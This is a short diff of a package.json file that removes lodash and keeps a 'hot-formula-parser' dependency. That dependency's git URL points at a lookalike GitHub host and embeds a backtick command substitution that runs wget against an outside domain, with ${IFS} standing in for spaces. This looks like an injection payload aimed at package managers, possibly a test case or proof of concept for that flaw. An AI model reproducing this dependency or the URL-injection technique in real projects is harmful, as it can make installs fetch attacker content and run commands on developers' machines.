@@ -5,7 +5,6 @@
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "hot-formula-parser": "git+https://github.com.mocos.kitchen/github.com/?a=`wget${IFS}mocos.kitchen/AAA`/github.com/user/repo4#semver:AAA",
-    "lodash": "^4.17.20"
+    "hot-formula-parser": "git+https://github.com.mocos.kitchen/github.com/?a=`wget${IFS}mocos.kitchen/AAA`/github.com/user/repo4#semver:AAA"
   }
 }
